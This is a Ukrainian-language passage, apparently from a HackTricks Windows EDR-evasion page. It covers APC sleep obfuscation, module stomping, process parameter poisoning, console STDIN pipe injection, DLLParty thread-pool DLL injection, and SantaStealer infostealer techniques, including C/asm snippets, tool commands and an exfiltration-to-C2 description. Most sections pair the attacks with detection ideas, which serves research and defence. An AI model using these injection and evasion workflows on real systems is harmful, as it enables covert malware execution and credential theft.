Якщо диспетчеризація timer-queue має надто впізнавану сигнатуру, ту саму послідовність sleep-encrypt-spoof-restore можна виконати з призупиненого допоміжного потоку за допомогою queued APCs:<sup>[[27]](#references)</sup>

- Створіть допоміжний потік із `NtTestAlert` як entrypoint.
- Поставте підготовлені фрейми `CONTEXT`/APCs у чергу через `NtQueueApcThread` і обробіть їх за допомогою `NtAlertResumeThread`.
- Зберігайте стан ланцюжка в heap, а не в стеку допоміжного потоку, щоб не вичерпати стандартний стек потоку розміром 64 KB.
- Використовуйте `NtSignalAndWaitForSingleObject`, щоб атомарно подати сигнал про початок і перейти в очікування.
- Призупиніть основний потік перед відновленням TIB/context (`NtSuspendThread` → restore → `NtResumeThread`), щоб зменшити період гонки, протягом якого сканер може побачити частково відновлений стек.

Це замінює сигнатуру `CreateTimerQueueTimer` + `NtContinue` на сигнатуру helper-thread/APC, зберігаючи ті самі цілі RC4 masking і stack-spoofing.

Додаткові ідеї для виявлення
- `NtSetInformationVirtualMemory` із `VmCfgCallTargetInformation` незадовго до сну, очікування або APC dispatch.
- Виклики `GetThreadContext`/`SetThreadContext` у зв’язці з `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` або `ConnectNamedPipe`.
- Виклик `NtQueryInformationThread`, за яким ідуть прямі записи в межі стека TEB/TIB поточного потоку.
- Ланцюжки `NtQueueApcThread`/`NtAlertResumeThread`, які опосередковано викликають `SystemFunction032`, `VirtualProtect` або helpers для відновлення дозволів секцій.
- Повторне використання коротких сигнатур гаджетів, як-от `FF 23` (`jmp [rbx]`) або `FF E7` (`jmp rdi`), як dispatch pivots усередині підписаних модулів.


## Точний Module Stomping

Module stomping виконує payload із **секції `.text` DLL, уже відображеної в цільовому процесі**, замість виділення очевидної приватної executable memory або завантаження нової sacrificial DLL. Ціль для перезапису має бути **завантаженим образом, прив’язаним до дискового файла**, чий простір коду може вмістити payload, не пошкодивши шляхи виконання, потрібні процесу.<sup>[[1]](#references)[[2]](#references)</sup>

### Надійний вибір цілі

Наївний stomping поширених модулів, як-от `uxtheme.dll` або `comctl32.dll`, ненадійний: DLL може бути не завантажена у віддалений процес, а замалий діапазон коду призведе до аварійного завершення процесу. Надійніший робочий процес:

1. Перерахуйте модулі цільового процесу та залиште **список включення лише з назвами** вже завантажених DLL.
2. Спочатку зберіть payload і зафіксуйте його **точний розмір у байтах**.
3. Проскануйте кандидатні DLL на диску та порівняйте **`.text` `Misc_VirtualSize`** PE section із розміром payload. Це важливіше за розмір файла, оскільки відображає розмір executable section **після завантаження в пам’ять**.
4. Розберіть **Export Address Table (EAT)** і виберіть RVA експортованої функції як початкове зміщення для stomp.
5. Оцініть **радіус ураження**: якщо payload перевищує межі вибраної функції, він перезапише сусідні exports, розташовані далі в пам’яті.

Типові допоміжні засоби для розвідки/вибору цілі, що трапляються на практиці:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Операційні нотатки
- Віддавайте перевагу DLL, які **вже завантажені** у віддалений процес, щоб уникнути телеметрії `LoadLibrary`/неочікуваного завантаження образів.
- Віддавайте перевагу exports, які цільовий застосунок виконує рідко; інакше звичайні шляхи виконання коду можуть звернутися до перезаписаних байтів до або після створення потоку.
- Для великих імплантів часто потрібно замінити вбудовування shellcode як рядкового літерала на **масив байтів/ініціалізатор у фігурних дужках**, щоб буфер повністю й коректно представлявся у вихідному коді інжектора.

Ідеї для виявлення
- Віддалений запис в executable-сторінки, підкріплені образом (`MEM_IMAGE`, `PAGE_EXECUTE*`), замість поширеніших приватних RWX/RX-виділень.
- Точки входу exports, чиї байти в пам’яті більше не збігаються з відповідними байтами у файлі на диску.
- Віддалені потоки або перемикання контексту, що починають виконання всередині export легітимної DLL, перші байти якого нещодавно було змінено.
- Підозрілі послідовності `VirtualProtect(Ex)` / `WriteProcessMemory` для сторінок `.text` DLL, за якими йде створення потоку.

## Poisoning параметрів процесу (P3)

Poisoning параметрів процесу (P3) — це техніка **ін’єкції в процес / обходу EDR**, яка уникає класичного шляху віддаленого запису (`VirtualAllocEx` + `WriteProcessMemory`). Замість копіювання байтів у вже запущений цільовий процес вона використовує те, що Windows **копіює вибрані параметри запуску `CreateProcessW` у дочірній процес** і зберігає їх у `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Переносники даних, які можна отруїти й які копіює `CreateProcessW`

Корисні переносники даних:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (з `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Практичні обмеження переносників даних:

- `lpCommandLine` має вказувати на **доступну для запису пам’ять** для `CreateProcessW`; його довжина обмежена **32 767 символами Unicode** разом із нульовим термінатором.
- `lpEnvironment` має бути блоком середовища Unicode з послідовних рядків `NAME=VALUE\0`, за якими йде додатковий `\0`.
- `lpReserved` офіційно зарезервований, тому відповідність `ShellInfo` слід вважати деталлю реалізації, а не стабільною документованою угодою.

Так звичайне створення процесу перетворюється на **примітив передавання payload**. Оператор створює дочірній процес з контрольованими зловмисником даними запуску, а Windows виконує копіювання між процесами.

### Потік пошуку у віддаленому процесі без API віддаленого запису

Після створення дочірнього процесу знайдіть скопійований буфер за допомогою примітивів **лише для читання**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → отримайте `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Прочитайте віддалений `PEB`
3. Перейдіть за `PEB.ProcessParameters`
4. Прочитайте `RTL_USER_PROCESS_PARAMETERS`
5. Використайте вибраний вказівник:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Мінімальний потік:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Виконання скопійованого буфера параметрів

Скопійована область параметрів зазвичай має права `RW`, а не є виконуваною. Поширений ланцюжок P3:

1. Створити процес звичайним способом (не призупиненим)
2. Зробити вибрану сторінку параметрів виконуваною за допомогою `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Повторно використати дескриптор головного потоку, уже повернутий у `PROCESS_INFORMATION`
4. Перенаправити виконання за допомогою `NtSetContextThread` (`CONTEXT_CONTROL`, перезаписати `RIP`)

На відміну від класичних сценаріїв перехоплення потоку, для цього **не потрібні** `SuspendThread` / `ResumeThread`; контекст можна змінити безпосередньо через дескриптор повернутого головного потоку.

Це дає змогу уникнути кількох API, за якими часто стежать під час ін’єкції:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- часто також `SuspendThread` / `ResumeThread`

### Обмеження нульового байта та багатостадійний shellcode

Усі три носії — це **рядкові або подібні до рядків дані**, тож необроблене навантаження, що містить `0x00`, обрізається під час передавання. Практичний обхідний шлях — **перший етап без нульових байтів**, який відновлює константи під час виконання, а потім завантажує довільний другий етап.

Простий шаблон — синтез констант на основі XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Це дає змогу першому етапу формувати рядки в стеку, аргументи API, шляхи до DLL або завантажувач shellcode другого етапу, не вбудовуючи нульові байти в переданий параметр.

### Виклики API зі стека на першому етапі

Коли першому етапу потрібно викликати API, наприклад `LoadLibraryA`, він може:

- розмістити рядок/буфер у стеку цільового процесу
- зарезервувати **32-байтовий shadow space x64**
- задати `RCX`, `RDX`, `R8`, `R9` константами або вказівниками відносно `RSP`
- забезпечити **16-байтове вирівнювання** `RSP` перед викликом

Потім другий етап можна скопіювати зі стека до області пам'яті `PAGE_READWRITE`, змінити її захист на `PAGE_EXECUTE_READ` за допомогою `VirtualProtect` і передати їй керування, уникаючи прямого виділення пам'яті RWX.

### Ідеї для виявлення

Автори згадують такі перспективні напрямки пошуку:

- `VirtualProtectEx` / `NtProtectVirtualMemory`, які надають **сторінкам параметрів процесу права на виконання**
- зміна захисту, за якою йдуть `SetThreadContext` / `NtSetContextThread`
- віддалене читання `PEB`, а потім `RTL_USER_PROCESS_PARAMETERS`
- незвично довгі значення або значення з високою ентропією в `lpCommandLine`, `lpEnvironment` чи `STARTUPINFO.lpReserved` під час створення процесу

### Примітки

- P3 — це **трюк для передавання даних між процесами**, а не повноцінний примітив виконання сам по собі: скопійованому параметру все ще потрібна зміна дозволу на виконання та спосіб перенаправлення виконання.
- Автори розглядали `RtlCreateProcessReflection` / Dirty Vanity, але відмовилися від цього варіанта, оскільки він усередині викликає підозрілі примітиви, як-от `NtWriteVirtualMemory` і `NtCreateThreadEx`.

Щоб доставити payload в **наявний** процес Windows через описи потоків, а потім перехопити адресу повернення потоку, що очікує, див. [Thread Name-Calling and Waiting Thread Hijacking](windows-process-injection-thread-name-calling-waiting-thread-hijacking.md).

## Console STDIN pipe injection

Інтерактивний дочірній процес із консоллю також можна використати як **примітив для передавання payload**. Інжектор перенаправляє стандартний ввід дочірнього процесу до каналу й надсилає маркер, за яким іде shellcode. Після того як консольна програма зчитує дані у власну приватну пам'ять, інжектор знаходить цей буфер, надає йому права на виконання та перенаправляє на нього дочірній потік. Це дає змогу уникнути `VirtualAllocEx` і `WriteProcessMemory`, але все одно є process injection, а не загальним способом обходу EDR.<sup>[[41]](#references)</sup>

Попри опис як «named-pipe», у довідковій реалізації викликається `CreatePipe`, який створює **анонімний канал**. Windows реалізує анонімні канали за допомогою внутрішніх об'єктів каналів з унікальними іменами, але PoC ані не вибирає шлях `\\.\pipe\<name>`, ані не викликає `CreateNamedPipe`. Він створює успадковувані дескриптори з дескриптором безпеки за замовчуванням, розміщує дескриптор читання в `STARTUPINFO.hStdInput`, задає `STARTF_USESTDHANDLES` і запускає новий дочірній процес з увімкненим успадкуванням дескрипторів. Отже, цей PoC запускає наданий виконуваний файл консолі; він не підключає свій канал до наявного процесу.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Еталонний робочий процес

У реалізації використовується такий ланцюжок:<sup>[[41]](#references)</sup>

1. Створити пари анонімних каналів для `STDIN` і `STDOUT` дочірнього процесу. Вимкнути успадкування для двох дескрипторів з боку батьківського процесу та закрити дублікати дескрипторів з боку дочірнього процесу в батьківському процесі після створення процесу.
2. Запустити інтерактивний виконуваний файл, наприклад `netsh.exe` або `nslookup.exe`, із прапорцем `CREATE_NEW_CONSOLE`. Дочірній процес успадковує перенаправлені стандартні дескриптори.
3. Надіслати весь бінарний масив `rawData` через `WriteFile`, використовуючи дескриптор `STDIN` з боку батьківського процесу. Консольна програма зчитує байти й залишає їх копію в одній зі своїх приватних виділених областей.
4. Переглянути адресний простір дочірнього процесу за допомогою `VirtualQueryEx`, прочитати кандидатні області `MEM_PRIVATE` через `ReadProcessMemory` і знайти маркер на початку `rawData`.
5. Змінити захист виявленого буфера на `PAGE_EXECUTE_READWRITE` за допомогою `VirtualProtectEx`.
6. Знайти головний потік, призупинити його, задати `RIP` як `found_address + 0x19` за допомогою `NtSetContextThread` і відновити його виконання.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Надана реалізація призначена лише для x64: вона змінює `CONTEXT.Rip`, а вбудований payload — це x64 shellcode. `rawData` починається з маркера завдовжки 25 байтів, тому виконувані байти починаються зі шістнадцяткового зсуву `0x19`. Замінюючи payload, збережіть цей макет або синхронно оновіть маркер, вектор пошуку, розмір масиву та зсув виконання. У коментарях до коду також зазначено, що `0x0A`, `0x0D` і `0x1A` є недопустимими символами. Цей процес не змінює токен чи привілеї дочірнього процесу.<sup>[[41]](#references)</sup>

Приклади створення невеликих нативних допоміжних програм і компіляції payload наведено в [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Ін’єкція DLL через callback пулу потоків без shellcode (DLLParty)

DLLParty адаптує ін’єкцію в пул потоків за схемою PoolParty так, щоб наявний робочий потік цільового процесу викликав `LoadLibraryA`, а не виконував ін’єктовану заглушку callback. Примітивом диспетчеризації є об’єкт завершення `TP_DIRECT`, поставлений у чергу порту завершення вводу-виводу пулу цільового процесу. Це не обходить дозволи процесу: PoC викликає `OpenProcess(PROCESS_ALL_ACCESS)` і потребує можливості читати й записувати пам’ять цільового процесу, а також дублювати дескриптори фабрики робочих потоків і порту завершення.<sup>[[46]](#references)[[47]](#references)</sup>

У Windows x64 робочий потік передає в `RCX`, першому аргументі callback, вказівник на `TP_CALLBACK_INSTANCE`, розміщений у стеку. `LoadLibraryA` інтерпретує той самий вказівник як `LPCSTR`. У протестованому випадку `TppWorkerThread` формує вказівник за адресою `RSP+0x178`, тоді як перший звичайний запис у цей об’єкт відбувається за адресою `RSP+0x1d0`. Тому шлях до DLL із нульовим завершенням, що вміщується в цей префікс розміром 0x58 байтів, може розташовуватися на початку екземпляра, не будучи перезаписаним до виклику. Це спостереження стосується конкретної збірки, а не є задокументованою гарантією ABI Windows.<sup>[[46]](#references)[[47]](#references)</sup>

Еталонний процес такий:<sup>[[46]](#references)[[47]](#references)</sup>

1. Перелічіть дескриптори цільового процесу за допомогою `NtQuerySystemInformation(SystemHandleInformation)` і визначте `TpWorkerFactory`, запитавши типи об’єктів. Дублюйте дескриптор фабрики робочих потоків і запросіть `WorkerFactoryBasicInformation`; поле `StartParameter` містить адресу віддаленого `TP_POOL`. Пропускайте фабрики, у яких `TotalWorkerCount == 0`.
2. Прочитайте `TP_POOL.CompletionPort` і пройдіть приватний список робочих потоків пулу. У протестованій збірці Windows 10 19045 x64 (`ntdll.dll 10.0.19041.4842`) його голова розташована за адресою `pool+0x60`; кожне посилання — за адресою `worker+0x10`, тому слот екземпляра callback за адресою `worker+0x38` відповідає `link+0x28`. PoC перевіряє вирівнювання вказівників, взаємність посилань, належність до пулу, ненульові ідентифікатори потоків, повторні вузли та незмінність голови списку.
3. Запишіть шлях до DLL у **кожен** знайдений слот робочого потоку, оскільки поставлене в чергу завершення може бути оброблене будь-яким робочим потоком. Розмістіть `TP_DIRECT` із `Callback = LoadLibraryA` у доступній для запису пам’яті цільового процесу. Замість `VirtualAllocEx` PoC використовує адресу `last_slot-0x500` у стеку робочого потоку; це експериментальний зсув, який не повинен перетинатися з активними даними стека.
4. Дублюйте дескриптор порту завершення цільового процесу та викличте `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. Адреса віддаленого `TP_DIRECT` є ключем завершення. Наявний робочий потік викликає `LoadLibraryA` із перезаписаним вказівником на екземпляр callback і завантажує DLL, доступну цільовому процесу.

PoC приймає PID цільового процесу (`DLLParty.exe <target_pid>`) і використовує жорстко заданий шлях до DLL у `DLLParty.cpp`; перед збиранням виконуваного файла x64 укажіть шлях, доступний цільовому процесу. Також він використовує адресу `LoadLibraryA` із власного процесу як віддалений callback, припускаючи, що ця адреса коректна в цільовому процесі. Код не перевіряє, чи вміщується шлях у префікс розміром 0x58 байтів, а також чи знайшов обхід списку робочих потоків хоча б один слот, перш ніж індексувати останній елемент. Перевірте приватні зсуви, макет стека та доступний для запису простір для цільової збірки. Відмова від `CreateRemoteThreadEx`, shellcode та `VirtualAllocEx` не усуває записів між процесами чи телеметрії завантаження DLL.<sup>[[46]](#references)[[47]](#references)</sup>

## Прийоми SantaStealer для fileless-ухилення та викрадення облікових даних

SantaStealer (також відомий як BluelineStealer) демонструє, як сучасні викрадачі інформації поєднують обхід AV, протидію аналізу та доступ до облікових даних в одному процесі.<sup>[[24]](#references)</sup>

### Перевірка розкладки клавіатури та затримка в sandbox

- Прапорець конфігурації (`anti_cis`) перераховує встановлені розкладки клавіатури за допомогою `GetKeyboardLayoutList`. Якщо знайдено кириличну розкладку, зразок створює порожній маркер `CIS` і завершує роботу до запуску викрадачів, гарантуючи, що він не спрацює в виключених регіонах, але залишить артефакт для пошуку.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Багаторівнева логіка `check_antivm`

- Варіант A обходить список процесів, хешує кожне ім’я за допомогою власної циклічної контрольної суми та порівнює результат із вбудованими списками блокування налагоджувачів і sandbox-середовищ; потім він повторно обчислює контрольну суму для імені комп’ютера та перевіряє робочі каталоги, як-от `C:\analysis`.
- Варіант B перевіряє системні властивості (мінімальну кількість процесів, час після останнього перезавантаження), викликає `OpenServiceA("VBoxGuest")` для виявлення VirtualBox additions і вимірює час до та після затримок, щоб виявити покрокове виконання. За будь-якого збігу роботу переривають до запуску модулів.

### Fileless helper і подвійне завантаження через ChaCha20 reflective loading

- Основна DLL/EXE містить Chromium credential helper, який або записується на диск, або вручну відображається в пам’яті; у fileless-режимі імпорти та relocations обробляються самостійно, тож артефакти helper не записуються.
- Цей helper зберігає DLL другого етапу, двічі зашифровану ChaCha20 (два 32-байтові ключі та два 12-байтові nonce). Після обох циклів blob завантажується через reflective loading (без `LoadLibrary`), а потім викликаються експорти `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, похідні від [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Процедури ChromElevator використовують reflective process hollowing через direct-syscall для впровадження коду в активний браузер Chromium, успадковують ключі AppBound Encryption і розшифровують паролі, cookies та дані кредитних карток безпосередньо з баз даних SQLite, обходячи захист ABE.

### Модульний збір даних у пам’яті та передавання через HTTP частинами

- `create_memory_based_log` перебирає глобальну таблицю вказівників на функції `memory_generators` і запускає по одному потоку для кожного ввімкненого модуля (Telegram, Discord, Steam, знімки екрана, документи, розширення браузера тощо). Кожен потік записує результати у спільні буфери та повідомляє кількість файлів після очікування потоків приблизно 45 секунд.
- Після завершення всі дані пакуються за допомогою статично скомпонованої бібліотеки `miniz` у `%TEMP%\\Log.zip`. Потім `ThreadPayload1` чекає 15 секунд і передає архів частинами по 10 MB через HTTP POST на `http://<C2>:6767/upload`, підробляючи межу браузерного `multipart/form-data` (`----WebKitFormBoundary***`). У кожній частині додаються `User-Agent: upload`, `auth: <build_id>`, необов’язковий `w: <campaign_tag>`, а в останній частині додається `complete: true`, щоб C2 знав, що повторне складання завершено.

## References

- [1] [Передові методи ухилення: точне підміщення модулів](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – блог](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Стек викликів: більше жодних поблажок для malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – документація](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – приклад](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – приклад](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – підроблення стека викликів PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Новий ланцюжок зараження та обфускація на основі ConfuserEx у DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Чи варто довіряти zero trust? Обхід перевірок відповідності вимогам Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – До ToolShell: дослідження попередніх ransomware-операцій Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: зловживання переспрямованими експортами](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Перелік переспрямованих експортів Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Порядок пошуку dynamic-link library](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Безпека процесів і права доступу](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Довідник EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Запускач CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Протидія EDR за підтримки Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Злам захисної оболонки Windows Defender за допомогою перенаправлення папок](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Довідник команди mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – За чистою завісою: від RAT до builder і coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer вже близько: новий амбітний infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Розшифрування Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: протидія malware на Node.js за допомогою трасування API](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Спляча красуня: приспати Adaptix за допомогою Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Отруєння параметрів процесу](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Спляча красуня II: CFG, CET і підроблення стека](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Обфускація сну Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com — Приховування Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com — Зловживання Chrome Remote Desktop під час операцій Red Team: практичний посібник](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research — BTR Reforged: використання драйвера відновлення Defender як примітива для операцій у ядрі](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY — BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Супровідний код Function Peekaboo від MDSec](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec — Function Peekaboo: створення функцій із самоприховуванням за допомогою LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn — VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [Вихідний код InjectSetConsole від TwoSevenOneT](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn — Функція CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn — Створення дочірнього процесу з перенаправленим введенням і виведенням](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian — GhostPack Necromancy: перероблення інструментів C# за допомогою WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge — Компіляція проєктів C# / .NET](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty: proof-of-concept і вихідний код](https://github.com/epersic/DLLParty)
- [47] [DLLParty — зловживання внутрішніми механізмами пулу потоків для ін’єкції DLL без shellcode](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [Набір даних для тестування EMBER2024 та інструменти thrember](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Використання EMBER2024 для оцінювання імплантів Red Team](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations — Ухилення від виявлення на основі машинного навчання](https://msecops.de/blog/posts/ml-evasion/)
- [51] [Kaspersky Securelist — Середовище завантаження .NET на основі XAML NetamLoader](https://securelist.com/netamloader/121676)
- [52] [Microsoft Learn — Перелік AMSI_RESULT](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
- [53] [Microsoft Learn — Метод IAntimalware::Scan](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-iantimalware-scan)
{{#include ../banners/hacktricks-training.md}}
